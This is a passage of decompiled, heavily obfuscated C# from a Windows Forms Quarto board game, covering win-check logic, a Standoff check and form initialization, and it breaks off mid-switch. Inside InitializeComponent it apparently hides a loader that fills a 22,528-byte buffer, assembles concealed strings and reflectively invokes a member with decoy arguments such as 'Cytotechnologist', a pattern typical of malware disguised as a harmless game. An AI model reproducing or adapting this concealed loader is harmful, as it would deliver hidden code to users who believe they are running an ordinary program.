					num = num58 ^ ((int)num2 * -764762299);
					continue;
				}
				case 47u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -295648931) ^ -2064986308;
						continue;
					}
					goto IL_03a3;
				case 46u:
					num = -2018234356;
					continue;
				case 45u:
				{
					int num54;
					if (mem[num6, 0] != null)
					{
						num = -1408727433;
						num54 = -1408727433;
					}
					else
					{
						num = -874290237;
						num54 = -874290237;
					}
					continue;
				}
				case 44u:
				{
					int num49;
					int num50;
					if (flag3)
					{
						num49 = -1495336106;
						num50 = -1495336106;
					}
					else
					{
						num49 = -1110715839;
						num50 = -1110715839;
					}
					num = num49 ^ ((int)num2 * -1104868487);
					continue;
				}
				case 43u:
				{
					int num47;
					if (mem[num6, 0].Square != mem[num6, 1].Square)
					{
						num = -874290237;
						num47 = -874290237;
					}
					else
					{
						num = -1626964573;
						num47 = -1626964573;
					}
					continue;
				}
				case 42u:
				{
					int num41;
					int num42;
					if (mem[1, 1] != null)
					{
						num41 = -1370300173;
						num42 = -1370300173;
					}
					else
					{
						num41 = -942769179;
						num42 = -942769179;
					}
					num = num41 ^ (int)(num2 * 267615668);
					continue;
				}
				case 41u:
					if (mem[num6, 2].Square != mem[num6, 3].Square)
					{
						num = (int)(num2 * 1047121334) ^ -1767913391;
						continue;
					}
					goto IL_036e;
				case 40u:
					num36 = ((mem[2, num6].Square == mem[3, num6].Square) ? 1 : 0);
					goto IL_004f;
				case 39u:
					num6 = 0;
					num = (int)(num2 * 860946809) ^ -1001641407;
					continue;
				case 38u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -731700212;
						continue;
					}
					goto IL_06f8;
				case 37u:
					if (mem[0, num6] != null)
					{
						num = -1442824133;
						continue;
					}
					goto IL_004e;
				case 36u:
				{
					int num30;
					int num31;
					if (mem[0, num6].Big != mem[1, num6].Big)
					{
						num30 = 1558568802;
						num31 = 1558568802;
					}
					else
					{
						num30 = 1186557911;
						num31 = 1186557911;
					}
					num = num30 ^ (int)(num2 * 2003605593);
					continue;
				}
				case 35u:
				{
					int num19;
					int num20;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num19 = -2094859242;
						num20 = -2094859242;
					}
					else
					{
						num19 = -928050184;
						num20 = -928050184;
					}
					num = num19 ^ (int)(num2 * 2002196248);
					continue;
				}
				case 34u:
				{
					int num12;
					int num13;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num12 = -1555883046;
						num13 = -1555883046;
					}
					else
					{
						num12 = -434580386;
						num13 = -434580386;
					}
					num = num12 ^ (int)(num2 * 1808634897);
					continue;
				}
				case 33u:
				{
					int num70;
					int num71;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num70 = -77889107;
						num71 = -77889107;
					}
					else
					{
						num70 = -1972704705;
						num71 = -1972704705;
					}
					num = num70 ^ (int)(num2 * 116720777);
					continue;
				}
				case 31u:
					flag = true;
					num = ((int)num2 * -1144851602) ^ 0x56D8E6AA;
					continue;
				case 30u:
				{
					int num69;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = -1181505407;
						num69 = -1181505407;
					}
					else
					{
						num = -459962036;
						num69 = -459962036;
					}
					continue;
				}
				case 29u:
				{
					int num65;
					int num66;
					if (mem[0, 0] == null)
					{
						num65 = 965401886;
						num66 = 965401886;
					}
					else
					{
						num65 = 1182883937;
						num66 = 1182883937;
					}
					num = num65 ^ (int)(num2 * 1398743805);
					continue;
				}
				case 28u:
				{
					int num64;
					if (mem[num6, 0].Dark == mem[num6, 1].Dark)
					{
						num = -1117225254;
						num64 = -1117225254;
					}
					else
					{
						num = -141965077;
						num64 = -141965077;
					}
					continue;
				}
				case 27u:
				{
					int num60;
					int num61;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num60 = -1096084141;
						num61 = -1096084141;
					}
					else
					{
						num60 = -608998049;
						num61 = -608998049;
					}
					num = num60 ^ (int)(num2 * 1449670250);
					continue;
				}
				case 26u:
				{
					int num55;
					if (mem[0, num6].Dark != mem[1, num6].Dark)
					{
						num = -1005259289;
						num55 = -1005259289;
					}
					else
					{
						num = -516478120;
						num55 = -516478120;
					}
					continue;
				}
				case 25u:
					if (mem[0, num6].Square == mem[1, num6].Square)
					{
						num = -463064007;
						continue;
					}
					goto IL_0119;
				case 24u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 961091728) ^ -1368376907;
						continue;
					}
					goto IL_03a3;
				case 23u:
				{
					int num52;
					int num53;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num52 = 1806772974;
						num53 = 1806772974;
					}
					else
					{
						num52 = 1198878618;
						num53 = 1198878618;
					}
					num = num52 ^ ((int)num2 * -418704078);
					continue;
				}
				case 22u:
				{
					int num51;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -490055746;
						num51 = -490055746;
					}
					else
					{
						num = -521215029;
						num51 = -521215029;
					}
					continue;
				}
				case 21u:
					if (mem[num6, 2].Point != mem[num6, 3].Point)
					{
						num = ((int)num2 * -2125618528) ^ -1039545427;
						continue;
					}
					goto IL_036e;
				case 20u:
				{
					int num48;
					if (mem[0, num6].Point == mem[1, num6].Point)
					{
						num = -1130844628;
						num48 = -1130844628;
					}
					else
					{
						num = -1356167240;
						num48 = -1356167240;
					}
					continue;
				}
				case 19u:
					if (mem[num6, 2].Dark != mem[num6, 3].Dark)
					{
						num = ((int)num2 * -1965391038) ^ -489418425;
						continue;
					}
					goto IL_036e;
				case 18u:
				{
					int num43;
					int num44;
					if (mem[num6, 1].Point == mem[num6, 2].Point)
					{
						num43 = 225900954;
						num44 = 225900954;
					}
					else
					{
						num43 = 2051283224;
						num44 = 2051283224;
					}
					num = num43 ^ ((int)num2 * -1875889115);
					continue;
				}
				case 17u:
					if (mem[2, num6].Point != mem[3, num6].Point)
					{
						num = (int)(num2 * 257802422) ^ -347562792;
						continue;
					}
					goto IL_0339;
				case 16u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 1720252629) ^ -533988330;
						continue;
					}
					goto IL_06f8;
				case 15u:
					num39 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0025;
				case 14u:
				{
					int num40;
					if (mem[num6, 0].Point == mem[num6, 1].Point)
					{
						num = -1280854125;
						num40 = -1280854125;
					}
					else
					{
						num = -1887568499;
						num40 = -1887568499;
					}
					continue;
				}
				case 13u:
				{
					int num37;
					int num38;
					if (mem[3, 3] != null)
					{
						num37 = -1877135416;
						num38 = -1877135416;
					}
					else
					{
						num37 = -886470719;
						num38 = -886470719;
					}
					num = num37 ^ ((int)num2 * -288482148);
					continue;
				}
				case 12u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)(num2 * 827098176) ^ -44427760;
						continue;
					}
					goto IL_03a3;
				case 11u:
				{
					int num32;
					int num33;
					if (mem[1, num6].Dark != mem[2, num6].Dark)
					{
						num32 = 1322320691;
						num33 = 1322320691;
					}
					else
					{
						num32 = 1197570570;
						num33 = 1197570570;
					}
					num = num32 ^ (int)(num2 * 1945729714);
					continue;
				}
				case 10u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -836897136) ^ 0x4A96A730;
						continue;
					}
					goto IL_0024;
				case 9u:
				{
					int num27;
					int num28;
					if (mem[2, 2] != null)
					{
						num27 = -515813486;
						num28 = -515813486;
					}
					else
					{
						num27 = -594016750;
						num28 = -594016750;
					}
					num = num27 ^ ((int)num2 * -381150265);
					continue;
				}
				case 8u:
					num = ((int)num2 * -1046344206) ^ 0x2B04F768;
					continue;
				case 7u:
					if (mem[2, num6].Big != mem[3, num6].Big)
					{
						num = (int)(num2 * 874839043) ^ -1785786307;
						continue;
					}
					goto IL_0339;
				case 6u:
					if (mem[1, num6] != null)
					{
						num = ((int)num2 * -289877011) ^ 0x5FA1BC74;
						continue;
					}
					goto IL_004e;
				case 5u:
				{
					int num17;
					int num18;
					if (mem[num6, 1].Square == mem[num6, 2].Square)
					{
						num17 = 1869587488;
						num18 = 1869587488;
					}
					else
					{
						num17 = 2130863850;
						num18 = 2130863850;
					}
					num = num17 ^ ((int)num2 * -2048981079);
					continue;
				}
				case 4u:
				{
					int num14;
					if (num6 >= 4)
					{
						num = -1549236779;
						num14 = -1549236779;
					}
					else
					{
						num = -1475236614;
						num14 = -1475236614;
					}
					continue;
				}
				case 3u:
					flag = true;
					num = ((int)num2 * -1500287865) ^ 0xB574839;
					continue;
				case 2u:
					num = (int)((num2 * 367867535) ^ 0x5A09395E);
					continue;
				case 1u:
				{
					int num9;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -415103706;
						num9 = -415103706;
					}
					else
					{
						num = -368878182;
						num9 = -368878182;
					}
					continue;
				}
				case 0u:
				{
					int num3;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = -1150645755;
						num3 = -1150645755;
					}
					else
					{
						num = -721355895;
						num3 = -721355895;
					}
					continue;
				}
				case 32u:
					break;
				default:
					{
						return result;
					}
					IL_0119:
					num36 = 0;
					goto IL_004f;
					IL_06f8:
					num39 = 0;
					goto IL_0025;
					IL_0025:
					flag3 = (byte)num39 != 0;
					num = -1995076756;
					continue;
					IL_03a3:
					num39 = 1;
					goto IL_0025;
					IL_036e:
					num36 = 1;
					goto IL_004f;
					IL_0339:
					num36 = 1;
					goto IL_004f;
					IL_004f:
					flag2 = (byte)num36 != 0;
					num = -598206713;
					continue;
					IL_01be:
					num39 = 1;
					goto IL_0025;
					IL_004e:
					num36 = 0;
					goto IL_004f;
					IL_0024:
					num39 = 0;
					goto IL_0025;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num7 = default(int);
		bool result = default(bool);
		bool flag3 = default(bool);
		int num3 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1040278120;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD4341CCFu) % 14u)
				{
				case 13u:
					num7 = 0;
					num = (int)(num2 * 988210844) ^ -1163756599;
					continue;
				case 12u:
					result = flag;
					num = (int)((num2 * 1314552778) ^ 0x3BC0778A);
					continue;
				case 11u:
					flag3 = mem[num7, num3] == null;
					num = -1105464070;
					continue;
				case 10u:
				{
					int num5;
					int num6;
					if (!flag2)
					{
						num5 = -885484441;
						num6 = -885484441;
					}
					else
					{
						num5 = -24465972;
						num6 = -24465972;
					}
					num = num5 ^ ((int)num2 * -749211979);
					continue;
				}
				case 8u:
					num = ((int)num2 * -408802514) ^ 0x43B12101;
					continue;
				case 6u:
					num3++;
					num = -841707375;
					continue;
				case 5u:
				{
					int num8;
					int num9;
					if (flag3)
					{
						num8 = 1879561503;
						num9 = 1879561503;
					}
					else
					{
						num8 = 1232536548;
						num9 = 1232536548;
					}
					num = num8 ^ ((int)num2 * -379982533);
					continue;
				}
				case 4u:
					num7++;
					num = ((int)num2 * -1084664235) ^ -186977019;
					continue;
				case 3u:
					flag = false;
					num = ((int)num2 * -993629986) ^ 0x31D5FE81;
					continue;
				case 2u:
					flag2 = num7 < 4;
					num = -1748023739;
					continue;
				case 1u:
					num3 = 0;
					num = -841707375;
					continue;
				case 0u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = -1560521673;
						num4 = -1560521673;
					}
					else
					{
						num = -1995534722;
						num4 = -1995534722;
					}
					continue;
				}
				case 9u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		Form1.smethod_32((Control)(object)label6, str);
		while (true)
		{
			int num = 1270732212;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x65731EE3u) % 7u)
				{
				case 6u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -2099055950) ^ -456356796;
					continue;
				case 5u:
					num = ((int)num2 * -1742904226) ^ -1891416915;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)((num2 * 1451080376) ^ 0x160A9637);
					continue;
				case 1u:
					num = (int)((num2 * 340024330) ^ 0x1D17A173);
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)((num2 * 1272773257) ^ 0x3B6A21AD);
					continue;
				default:
					return;
				case 4u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -472375590;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x8D5918D1u) % 10u)
				{
				case 9u:
					num = (int)(num2 * 699457189) ^ -205732913;
					continue;
				case 8u:
					num3 = ((components != null) ? 1 : 0);
					goto IL_0021;
				case 6u:
					num = (int)((num2 * 1082020240) ^ 0x4569A803);
					continue;
				case 5u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -1473798444) ^ 0x7BEA0C09;
					continue;
				case 4u:
					((Form)this).Dispose(disposing);
					num = -561874449;
					continue;
				case 3u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -1689675859;
						num5 = -1689675859;
					}
					else
					{
						num4 = -1210022258;
						num5 = -1210022258;
					}
					num = num4 ^ (int)(num2 * 1835885592);
					continue;
				}
				case 2u:
					num = (int)((num2 * 2002434649) ^ 0x73130469);
					continue;
				case 1u:
					if (disposing)
					{
						num = ((int)num2 * -1680456266) ^ -1507280093;
						continue;
					}
					num3 = 0;
					goto IL_0021;
				default:
					return;
				case 7u:
					break;
				case 0u:
					return;
					IL_0021:
					flag = (byte)num3 != 0;
					num = -1309356644;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		int num3 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num = -1032226336;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8AC987FFu) % 129u)
				{
				case 128u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -18494341) ^ 0x5138D03E;
					continue;
				case 127u:
					num = (int)((num2 * 1177592570) ^ 0x65919CFB);
					continue;
				case 126u:
					num = ((int)num2 * -1225574050) ^ 0x39A1AE15;
					continue;
				case 125u:
					array = new byte[22528];
					num3 = 0;
					num = ((int)num2 * -854947406) ^ -804555235;
					continue;
				case 124u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 481100623) ^ -382447781;
					continue;
				case 123u:
					num = ((int)num2 * -780751509) ^ 0x4A2D9E9A;
					continue;
				case 122u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -1525903299) ^ 0x22B2560D;
					continue;
				case 121u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)(num2 * 311038523) ^ -341982633;
					continue;
				case 120u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 273982955) ^ -446123162;
					continue;
				case 119u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -819946484) ^ -568321596;
					continue;
				case 118u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)((num2 * 2107963653) ^ 0x22C32A1B);
					continue;
				case 117u:
					num = ((int)num2 * -1387424425) ^ -546428469;
					continue;
				case 116u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1180274217) ^ -377322740;
					continue;
				case 115u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)(num2 * 2143417758) ^ -536335710;
					continue;
				case 114u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)((num2 * 1468120823) ^ 0x3A073025);
					continue;
				case 113u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = (int)((num2 * 1745730083) ^ 0x10D57AF8);
					continue;
				case 112u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 1994902038) ^ 0x6D38D0DF);
					continue;
				case 111u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)(num2 * 1969780458) ^ -1825652896;
					continue;
				case 110u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -2061127730) ^ 0x3D2E85A8;
					continue;
				case 109u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1591621904) ^ 0x20CB8B48;
					continue;
				case 108u:
					num = ((int)num2 * -1499633568) ^ 0x485776FE;
					continue;
				case 107u:
					pictureBox1 = Form1.smethod_2();
					button2 = Form1.smethod_53();
					num = (int)((num2 * 1495361671) ^ 0x9DB388F);
					continue;
				case 106u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -244871537) ^ -451274292;
					continue;
				case 105u:
					num = (int)(num2 * 2102140816) ^ -2031294131;
					continue;
				case 104u:
					string_ = Veet.Sa;
					num = (int)(num2 * 1068682685) ^ -1944724238;
					continue;
				case 103u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -1012862688) ^ 0xD21C880;
					continue;
				case 102u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)(num2 * 1736240831) ^ -413803353;
					continue;
				case 101u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1670626893) ^ 0x5DFF97E1;
					continue;
				case 100u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -2119490121) ^ 0x6D78C629;
					continue;
				case 99u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)((num2 * 1046827706) ^ 0x7798F192);
					continue;
				case 98u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -625588847) ^ 0x1DD56454;
					continue;
				case 97u:
					num = ((int)num2 * -1698287931) ^ 0x2AF769FC;
					continue;
				case 96u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1748330361) ^ 0x524A9164;
					continue;
				case 95u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 666475870;
						num5 = 666475870;
					}
					else
					{
						num4 = 1011597616;
						num5 = 1011597616;
					}
					num = num4 ^ (int)(num2 * 736724792);
					continue;
				}
				case 94u:
					num = (int)((num2 * 81152463) ^ 0x23765513);
					continue;
				case 93u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)(num2 * 2054573453) ^ -765151711;
					continue;
				case 92u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)(num2 * 1731218118) ^ -1077014232;
					continue;
				case 91u:
					Form1.smethod_64((Control)(object)label5, 12);
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1226633063) ^ 0x62149081;
					continue;
				case 90u:
					num = (int)(num2 * 1963843733) ^ -1910608564;
					continue;
				case 89u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1864313345) ^ 0x5BDC4442;
					continue;
				case 88u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 1731083389) ^ 0x54A10D9F);
					continue;
				case 87u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -979624779) ^ -1130678180;
					continue;
				case 86u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					num = (int)(num2 * 180852872) ^ -1317164172;
					continue;
				case 85u:
					num = ((int)num2 * -453565609) ^ 0x2C727AF0;
					continue;
				case 84u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -418463525) ^ -441703304;
					continue;
				case 83u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)(num2 * 1000867829) ^ -1409376366;
					continue;
				case 82u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)((num2 * 861561186) ^ 0x2BEF1368);
					continue;
				case 81u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 1437467379) ^ 0x1181B403);
					continue;
				case 80u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -1548580274) ^ 0x52D380AE;
					continue;
				case 78u:
					num = (int)(num2 * 288410447) ^ -1486379717;
					continue;
				case 77u:
					num = (int)(num2 * 304798195) ^ -886496041;
					continue;
				case 76u:
					num = (int)(num2 * 1649173389) ^ -208929099;
					continue;
				case 75u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -1338512106) ^ -170149915;
					continue;
				case 74u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1816132440) ^ -1428617824;
					continue;
				case 73u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -204467751) ^ 0x57385B90;
					continue;
				case 72u:
					num = -484233464;
					continue;
				case 71u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1968471454) ^ 0x5EF57D2A;
					continue;
				case 70u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1653905462) ^ -670952144;
					continue;
				case 69u:
					label1 = Form1.smethod_57();
					num = (int)(num2 * 1608675692) ^ -1683193793;
					continue;
				case 68u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1181430462) ^ 0x3A82C9B5;
					continue;
				case 67u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -868804967) ^ -2117338146;
					continue;
				case 66u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)((num2 * 2027599259) ^ 0x7C1D3810);
					continue;
				case 65u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 138837654) ^ -1298428584;
					continue;
				case 64u:
					num = (int)(num2 * 733964286) ^ -174101757;
					continue;
				case 63u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)(num2 * 810965954) ^ -1189597252;
					continue;
				case 62u:
					num = ((int)num2 * -438300777) ^ -2082102637;
					continue;
				case 61u:
					num = (int)((num2 * 680820244) ^ 0x5660E7E4);
					continue;
				case 60u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 96968104) ^ 0x366EDBD0);
					continue;
				case 59u:
					num = (int)(num2 * 1146594301) ^ -444142453;
					continue;
				case 58u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -531459333) ^ 0x7E97F53;
					continue;
				case 57u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -1670519047) ^ 0x498546E;
					continue;
				case 56u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -1134334583) ^ -600689705;
					continue;
				case 55u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 753171826) ^ 0x35FAA06);
					continue;
				case 54u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 126078648) ^ -1411618081;
					continue;
				case 53u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -822955456) ^ 0x4107709D;
					continue;
				case 52u:
					num3++;
					num = (int)((num2 * 2016903263) ^ 0x30B0C8D);
					continue;
				case 51u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -620735515) ^ -586349476;
					continue;
				case 50u:
					num = (int)((num2 * 929560922) ^ 0x2594B8CF);
					continue;
				case 49u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 1389287823) ^ 0x5935E8F);
					continue;
				case 48u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)(num2 * 839919364) ^ -605219767;
					continue;
				case 47u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -435342218) ^ -728421870;
					continue;
				case 46u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1408315950) ^ 0x38EB8AC6);
					continue;
				case 45u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)(num2 * 51786875) ^ -757865116;
					continue;
				case 44u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1960322496) ^ -915460234;
					continue;
				case 43u:
					Form1.smethod_61((Control)(object)label2, "label2");
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 1908563593) ^ -840376555;
					continue;
				case 42u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 338813571) ^ -1228721305;
					continue;
				case 41u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 2010889071) ^ -1082977312;
					continue;
				case 40u:
					num = ((int)num2 * -1854128443) ^ -1246762887;
					continue;
				case 39u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -462784021) ^ 0x1A2190E9;
					continue;
				case 38u:
					components = Form1.smethod_52();
					num = ((int)num2 * -1191827896) ^ -564133784;
					continue;
				case 37u:
					num = (int)((num2 * 51179945) ^ 0xDF93D67);
					continue;
				case 36u:
					num = ((int)num2 * -1657093264) ^ 0x4EFBE130;
					continue;
				case 35u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 1156147596) ^ -1251386384;
					continue;
				case 34u:
					num = ((int)num2 * -1086545920) ^ -489033497;
					continue;
				case 33u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -848148961) ^ 0x68A78B89;
					continue;
				case 32u:
					num = (int)((num2 * 1285244015) ^ 0x13A35B1B);
					continue;
				case 31u:
					num = ((int)num2 * -833242494) ^ 0x2B11EEF2;
					continue;
				case 30u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1938199795) ^ 0x70C15EF7);
					continue;
				case 29u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -2056376801) ^ 0x3DC61C8F;
					continue;
				case 28u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 1291645808) ^ 0x3BFCF20C);
					continue;
				case 27u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)(num2 * 1781136404) ^ -1365372421;
					continue;
				case 26u:
					num = (int)(num2 * 689496907) ^ -1700411929;
					continue;
				case 25u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = ((int)num2 * -1807373952) ^ -1256335542;
					continue;
				case 24u:
					num = (int)((num2 * 765283149) ^ 0x7F3EBDB2);
					continue;
				case 23u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)(num2 * 228669218) ^ -1142964144;
					continue;
				case 22u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 2057530848) ^ 0x2CB2C2DD);
					continue;
				case 21u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -2074680902) ^ 0x7502516F;
					continue;
				case 20u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -971097257) ^ 0xC274E07;
					continue;
				case 19u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)(num2 * 440996665) ^ -1826351680;
					continue;
				case 18u:
					flag = num3 < 22528;
					num = -1289735922;
					continue;
				case 17u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 674544998) ^ -233027126;
					continue;
				case 16u:
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -237975057) ^ -354061777;
					continue;
				case 15u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -1326836574) ^ 0x2B0D57BE;
					continue;
				case 14u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 1176933710) ^ 0x73827C3C);
					continue;
				case 13u:
					num = (int)((num2 * 1155907230) ^ 0x28E0EA92);
					continue;
				case 12u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -583648704) ^ 0x1BDDBD4E;
					continue;
				case 11u:
